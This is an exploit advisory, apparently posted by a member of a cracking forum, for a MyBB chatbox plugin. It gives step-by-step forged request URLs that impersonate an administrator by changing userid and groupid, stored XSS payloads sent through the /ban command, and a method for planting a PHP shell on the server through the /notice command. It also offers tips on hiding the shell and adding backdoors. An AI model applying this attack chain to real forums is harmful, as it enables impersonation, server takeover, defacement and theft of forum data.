# Date: 03.02.2013
# Author: Inquiry from http://crackhackforum.com
# Vendor or Software Link: http://community.mybb.com/thread-63559.html
# Software Link: community.mybb.com/attachment.php?aid=17079
# Version: Affected are all versions up to 3.6.2
# Google Keywords: 
# Tested on: Opera 12.15 & FireFox 21
##Greetings to all http://crackhackforum.com members.##

########################################################################################
[Introduction]
ChangUonDyU - Extra File Chatbox is a MyBB plugin used for live chatting with other users on the forum. The developer was probably quite lazy(no offense) because of the high amount of vulnerabilities in the plugin. With a short look there exists several persistent Cross Site Scripting vulnerabilities, Code Execution and Authentication Vulnerability. Despite the XSS and Code Execution are the most dangerous in the list, Authentication vulnerability makes it all possible to happen. The impact of the vulnerability is very dangerous and combining all these could lead to defacing. To be exact it&#039;s possible to upload a shell to the target server and with just being a regular user. The concept is actually easy, A regular member is able to register the forum and use the shoutbox. As there is a &#039;small&#039; Authentication vulnerability the regular member with no permissions at all is able to gain Administrator privileges to perform the actions any person with real privileges is able to. Yet with having Administrator privileges it&#039;s possible to trigger several XSS&#039;s and Code Execution. With persistent XSS we&#039;re able to steal the Security tokens of Administrator to perform CSRF & with Code Execution we&#039;re able to execute our shell on the targets system. 

[0x01 XSS]
Actually there&#039;s no XSS protection at all and all the forms are vulnerable to it. The ones which are appearing the most are with the &#039;Ban User&#039; command and &#039;Notice&#039; command. In this example I&#039;ll tell you the XSS with the Ban command because we&#039;ll upload the shell with the /notice command.
Banning works by entering a banning command which states the user ID and banning reason as such : /ban 1(bans the person with ID 1 in the forum) Advertising(The reason which goes to the logs to review incase you&#039;d like to unban). By removing the banning reason with the XSS payload, it&#039;ll be executed.

Example : Original & XSS banning commands which will ban the person with User ID 1 which is mostly Administrator
Original : /ban 1 advertising 
Malicious : /ban 1 <script>alert(&#039;1&#039;)</script>

Note: XSS won&#039;t disappear after unbanning the user, no matter if you&#039;re even re-banning him several times. As the messge goes to the Archive of the shoutbox, it&#039;ll leave only after using the /prune command to clear the chatbox & it&#039;s archive.
The questions remains, how we&#039;re able to use it because only administrators and Staffs/Moderators are able to ban. There&#039;s also a solution to this, if you read the above then you know that there&#039;s also a Authentication vulnerability which allows us to gain the rights. Scroll down the page to find out how although I suggest to keep reading.

Proof of Concept : 
function build_ban($shout)
{
	global $config,$phrase;
	$text = "ban > $shout[userid] > $shout[username] > $shout[dateline] > <span class=&#039;smallfont&#039;>#<b>$shout[username]</b> ";
	if (!empty($shout[&#039;banusername&#039;]))
	{
		$text .= "$phrase[banned_name] <a href=&#039;http://{$config[&#039;cbforumlink&#039;]}/member.php?action=profile&uid=$shout[banuserid]&#039; target=&#039;_blank&#039;>$shout[banusername]</a>";
	}
	else
	{
		$text .= "$phrase[banned] <a href=&#039;http://{$config[&#039;cbforumlink&#039;]}/member.php?action=profile&uid=$shout[banuserid]&#039; target=&#039;_blank&#039;>$shout[banuserid]</a>";
	}
	if ($shout[&#039;reason&#039;]) $text .= ". <i>$phrase[reason]: $shout[reason].</i>";
	$text .= &#039;#</span>&#039;;
	return $text;
}

[0x02 Code Execution]
Like I told above there are several vulnerabilities and alot of XSS&#039;s and almost all the forms in the chatbox&#039;s Cpanel aren&#039;t having any kind of protection. So doesn&#039;t have the /notice page it either. It&#039;s actually quite easy to trigger the XSS in there because we just have to insert our payload as a Notice, but as I said there&#039;s no protection which gives us an oppornutunity for Code Execution. You&#039;re almost all smart enough in here I assume that you know what that means, but I&#039;ll go through it with a sentence to make it clear to everyone. With entering XSS payload as the notice such as <script>alert(&#039;1&#039;)</script> it&#039;ll be executed. Yet we can replace the XSS payload with the code we&#039;d like and that code could be a PHP shell and it&#039;ll be executed on the server and gives us access to it. Yet again we don&#039;t have any permissions to trigger the Code Execution, but read below because there&#039;s the solution. The downside of this is that you can access the shell through the shoutbox and that&#039;s obvious as we executed the shell through the shoutbox&#039;s notice. You can use any of these 404:forbidden shells because that&#039;ll give you some extra time yet that&#039;s enough to make another backdoor and put the shoutbox working again although it works, just the notice will appear as a 404:forbidden. 

Proof of Concept : 
function build_notice()
{
        global $fcbfile,$smilies;
        $noticef = file_get_contents($fcbfile[&#039;notice&#039;]);
        $handle = fopen($fcbfile[&#039;ds_notice&#039;],"w");
        if ($noticef)
        {
                $noticef = BBCode($noticef);
                $noticef = strtr($noticef, $smilies);
        }
        fwrite($handle, $noticef);
        fclose($handle);
}

[0x03 Authentication Vulnerability]
That&#039;s probably the most interesting finding in the whole package, atleast it is in my sight and that&#039;s the point which makes the two above & one below possible. When I was looking for various security risks in the plugin I also opened up HTTP live header which is a popular FireFox addon for viewing the HTTP traffic going by. With chatting to myself in the WAMP I also took a look at the HTTP headers and noticed that the HTTP requests for posting a message in the shoutbox and it looked as following : 

Explained : http://host.ltd/[path]/chatbox/index.php?do=postshout&key=[SSID]&userid=1000&groupid=1&username=<span style="color: [The color of the username];"><strong>[Name]</strong></span>&message=[Message]
Real request : http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=2&groupid=1&username=<span style="color: #5EFF00;"><strong>Inquiry</strong></span>&message=Inquiry


 http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=Admin
 Like you can see I&#039;ve changed some details with the original request. Actually almost all the data except the Security Token which protects against CSRF. I have changed the "UserID" from 2 to 1, "GroupID" from 1 to 4, "Color:" from #5EFF00 to #FF0000 and "Username" from Inquiry to Crackhackforum. Then let&#039;s give it a shot and load the request. After proccessing the request, there should appear a new message in the shoutbox. Yet now the username doesn&#039;t appear as yours, but as a Administrators. Your User ID doesn&#039;t show up as yours, but as Administrator&#039;s. And by the way how the developer gives permission of the shoutbox, by the group ID, you also have that one as Administrator as GroupID=4 belongs to Administrators. Also the username will look red like it is in most of MyBB forums. The best thing about is that you really are looking as a legitimate username and even another Administrator can&#039;t make sure that you&#039;re the wrong one. The conclusion we can make from here is that you&#039;re now a LEGIT administrator of the shoutbox and absolutely nobody can&#039;t claim otherwise. That&#039;s fun to play a Administrator on a random forum indeed, but we&#039;re still trying to make some more progress and go further. Like we know, we&#039;re being shown as Administrators and with the Administrator place there comes permissions to ban, prune & give new notices and alot more. That&#039;s how we&#039;re trying to make some progress. 
 Now we&#039;ll test is our hint correct and are we able to use the Administrator&#039;s privileges. For that we&#039;ll just use a simple pruning command to see if it takes affect and if it does then it means we&#039;re successful. The pruning command would look as such then : 
 
 http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=/prune
 
 
 http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=/ban 1000 [XSS payload]
 As we already know that we&#039;re Administrators with legit privileges it isn&#039;t a surprise for us that also that one works and the XSS will be executed. The second thing is adding the new notice which goes mainly through the chatbox&#039;s Cpanel where we don&#039;t have access, but it&#039;s also possible to update the notice through the shoutbox with a simple command which I&#039;ll show you. 
 
 http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=/notice [<?php PHP shell goes here ?>]

 After proccessing this code it&#039;ll be executed and you have your shell on the server which will give you permission to the whole database to do whatever you&#039;d like. 
Note*: You have to click the link(e.g posting it to the shoutbox and then clicking it) or otherwise the request won&#039;t be processed.
Note*: You have to either decode the URL or remove the spaces. It&#039;s because you have to click the link, but if there are spaces then the URL will be read to the first space. 
Note*: Your shoutbox might use the colors name instead of HEX values. It depends on the shoutbox you&#039;re using. 
 Proof of Concept : 
 ##### POST SHOUT #######
if ($_REQUEST[&#039;do&#039;] == &#039;postshout&#039;)
{
	$managegroup = explode(",", $config[&#039;managegroup&#039;]);
	$shout = $_REQUEST;
	
	if ($config[&#039;check_domain_reffer&#039;] AND !checkpost($config[&#039;forumlink&#039;] , $_SERVER[&#039;HTTP_REFERER&#039;]))
	{
		echo $phrase[&#039;accessdenied&#039;];
		exit;
	}
	
	$request_ip = $_SERVER[&#039;REMOTE_ADDR&#039;];
	
	if ($config[&#039;strip_slash&#039;])
	{
		$shout[&#039;username&#039;] = stripslashes($shout[&#039;username&#039;]);
		$shout[&#039;message&#039;] = stripslashes($shout[&#039;message&#039;]);
	}
	
	if ($config[&#039;check_chatbox_key&#039;] AND !check_chatbox_key($shout[&#039;key&#039;], $shout[&#039;userid&#039;], $shout[&#039;username&#039;], $shout[&#039;groupid&#039;]))
	{
		echo $phrase[&#039;accessdenied&#039;];
		exit;
	}
	
	$banneds = unserialize(file_get_contents($fcbfile[&#039;ds_banned&#039;]));

	$cancommand = false;
	if (in_array($shout[&#039;groupid&#039;], $managegroup))
	{
		$cancommand = true;
	}
	
	if ($shout[&#039;message&#039;] && $shout[&#039;userid&#039;])
	{
		// CHECK BANNED USER
		if (isset($banneds[$shout[&#039;userid&#039;]]))
		{
			echo $phrase[&#039;bannotice&#039;];
			exit;
		}
 
 [0x04 XSS & HTML injection on the HTTP request]
 That&#039;s probably the same dangerous as the first XSS and comparing it to those vulnerabilities above it&#039;s basically nothing. Yet if I wouldn&#039;t find the other ones then it would be a critical one and I think it&#039;s worth to be mentioned. It&#039;s kinda related to the above vulnerability which means the /index.php?do=postshout can be exploited in several ways. Again, comparing to the above vulnerabilities it&#039;s kinda useless although maybe the Administrator blocks the other vulnerabilities and then it could work out. I think that expalaining of this doesn&#039;t need any further sentences because you can understand it from the link : 
 
  http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span><Here goes HTML or XSS>&message=CrackHackForum
 
 Proof of Concept : The same as it&#039;s with the 0x03
 ##Greetings to all http://crackhackforum.com members and specially to BaseHack Network crew members Thallium, DES and Vash.##

